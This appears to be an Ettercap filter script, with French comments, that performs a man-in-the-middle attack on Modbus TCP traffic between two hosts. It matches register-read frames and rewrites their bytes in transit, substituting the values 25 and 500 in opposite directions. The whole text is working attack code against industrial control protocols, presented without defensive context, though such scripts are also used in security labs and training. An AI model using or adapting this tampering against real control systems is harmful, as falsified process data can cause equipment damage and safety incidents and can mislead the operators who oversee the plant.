if (ip.proto == TCP && tcp.dst == 502) {
    if (ip.src == '192.168.1.11' && ip.dst == '192.168.1.13') {
        if (tcp.data) {
            if (tcp.data[7] == 0x03 && tcp.data[8] == 0x00 && tcp.data[9] == 0x00 && tcp.data[10] == 0x00 && tcp.data[11] == 0x01) {
                msg("Intercepting Modbus packet from 192.168.1.11 to 192.168.1.13\n");
                tcp.data[11] = 0x19;  # 25 en hexadécimal
            }
        }
    } else if (ip.src == '192.168.1.13' && ip.dst == '192.168.1.11') {
        if (tcp.data) {
            if (tcp.data[7] == 0x03 && tcp.data[8] == 0x00 && tcp.data[9] == 0x00 && tcp.data[10] == 0x00 && tcp.data[11] == 0x01) {
                msg("Intercepting Modbus packet from 192.168.1.13 to 192.168.1.11\n");
                tcp.data[11] = 0xF4;  # 500 en hexadécimal
                tcp.data[10] = 0x01;
            }
        }
    }
}
